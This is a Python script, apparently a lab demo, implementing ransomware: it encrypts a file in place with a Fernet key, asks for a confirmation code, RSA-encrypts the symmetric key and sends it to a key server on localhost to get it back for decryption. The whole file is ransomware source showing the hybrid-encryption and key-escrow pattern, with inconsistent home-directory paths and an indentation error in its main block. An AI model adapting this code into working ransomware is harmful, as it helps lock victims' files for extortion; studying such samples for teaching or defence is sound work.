import socket
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet

hostname = "127.0.0.1"
port = 8000

def sendEncryptedKey(eKeyFilePath):
    
    with socket.create_connection((hostname, port)) as sock:
        with open(eKeyFilePath, "rb") as file:
            encrypted_key = file.read()
        sock.sendall(encrypted_key)
        decrypted_key = sock.recv(4096)
    return decrypted_key

def decryptFile(filePath, key):
    f = Fernet(key)
    with open(filePath, "rb") as file:
        encrypted_data = file.read()
    plaintext = f.decrypt(encrypted_data)
    with open(filePath, "wb") as file:
        file.write(plaintext)
    print(f"[+] Decrypted file written to {filePath}")

if __name__ == "__main__":
  
   symmetricKey = Fernet.generate_key()
    fernet = Fernet(symmetricKey)
    filePath = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"
    with open(filePath, "rb") as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    with open(filePath, "wb") as file:
        file.write(encrypted_data)
    print(f"[+] File encrypted in place: {filePath}")

    print("To decrypt your file please enter the correct confirmation code.")
    code = input("Enter code: ")
    if code.strip() != "wahoo":
        print("Incorrect code. Exiting.")
        exit(1)
      
    with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    encryptedSymmetricKey = public_key.encrypt(
        symmetricKey,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    eKeyFilePath = "encryptedSymmetricKey.key"
    with open(eKeyFilePath, "wb") as key_file:
        key_file.write(encryptedSymmetricKey)
    print(f"[+] Encrypted key written to {eKeyFilePath}")

    clear_key = sendEncryptedKey(eKeyFilePath)
    print(f"[+] Received decrypted key: {clear_key}")

    decryptFile(filePath, clear_key)
